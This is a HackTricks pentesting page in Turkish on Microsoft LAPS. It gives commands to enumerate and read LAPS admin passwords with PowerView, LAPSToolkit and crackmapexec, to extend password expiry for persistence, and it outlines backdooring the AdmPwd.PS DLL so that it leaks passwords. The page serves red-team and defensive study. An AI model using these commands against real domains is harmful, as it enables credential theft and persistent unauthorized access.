# LAPS

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'a katılın!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**'a PR göndererek paylaşın.

</details>

## Temel Bilgiler

Local Administrator Password Solution (LAPS), **benzersiz, rastgele ve sık sık değiştirilen** yönetici parolalarının uygulandığı bir sistem yönetimi aracıdır. Bu parolalar, Active Directory içinde güvenli bir şekilde depolanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilen kullanıcılar tarafından erişilebilir. İstemciden sunucuya yapılan parola iletimlerinin güvenliği, **Kerberos sürüm 5** ve **Advanced Encryption Standard (AES)** kullanılarak sağlanır.

LAPS'nin uygulanmasıyla, etki alanının bilgisayar nesnelerine **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`** olmak üzere iki yeni özellik eklenir. Bu özellikler, sırasıyla **düz metin yönetici parolasını** ve **son kullanma zamanını** depolar.

### Aktifleştirilip aktifleştirilmediğini kontrol edin
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Parola Erişimi

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **LAPS politikasının ham halini indirebilirsiniz** ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinde bulunan **`Parse-PolFile`** kullanılabilir.

Ayrıca, **yerel LAPS PowerShell cmdlet'leri** kullanılabilirse, erişimi olan bir makinede kullanılabilir:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** ayrıca **kimin şifreyi okuyabileceğini ve okuyabileceğini** bulmak için de kullanılabilir:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), LAPS'ı birkaç fonksiyonla sıralamayı kolaylaştırır.\
Bunlardan biri, **LAPS etkin olan tüm bilgisayarlar için ExtendedRights'in ayrıştırılmasıdır**. Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okuma yetkisine sahip olan grupları** gösterecektir.\
Bir **hesap**, bir bilgisayarı bir etki alanına katıldığında, o makine üzerinde `Tüm Extended Rights` alır ve bu hak, **hesaba şifreleri okuma yeteneği** verir. Sıralama, bir makinedeki LAPS şifresini okuyabilen bir kullanıcı hesabını gösterebilir. Bu, LAPS şifrelerini okuyabilen belirli AD kullanıcılarını hedeflememize yardımcı olabilir.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Crackmapexec ile LAPS Şifrelerini Sızdırma**
Eğer bir powershell erişimi yoksa, LDAP üzerinden bu yetkiyi kötüye kullanarak uzaktan erişim sağlanabilir. Bunun için aşağıdaki adımları izleyin:
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Bu, kullanıcının okuyabileceği tüm şifreleri dökecek ve farklı bir kullanıcıyla daha iyi bir yerleşim elde etmenizi sağlayacaktır.

## **LAPS Kalıcılığı**

### **Son Kullanma Tarihi**

Yönetici olduktan sonra, şifreleri elde etmek ve bir makinenin şifresini güncellemesini önlemek için son kullanma tarihini geleceğe ayarlamak mümkündür.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Parola, bir **admin** tarafından **`Reset-AdmPwdPassword`** cmdlet kullanıldığında veya LAPS GPO'da **Politika tarafından gereklenden daha uzun bir parola süresi izin verilmez** seçeneği etkinleştirildiğinde hala sıfırlanır.
{% endhint %}

### Arka Kapı

LAPS için orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kodun içine (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yöntemi içine) bir arka kapı yerleştirmek mümkündür. Bu arka kapı, yeni parolaları bir şekilde **dışarıya sızdıracak veya bir yerde depolayacak** şekilde tasarlanmalıdır.

Ardından, yeni `AdmPwd.PS.dll` derlenir ve makineye `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` yoluna yüklenir (ve değiştirilme zamanı değiştirilir).

## Referanslar
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'ler**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
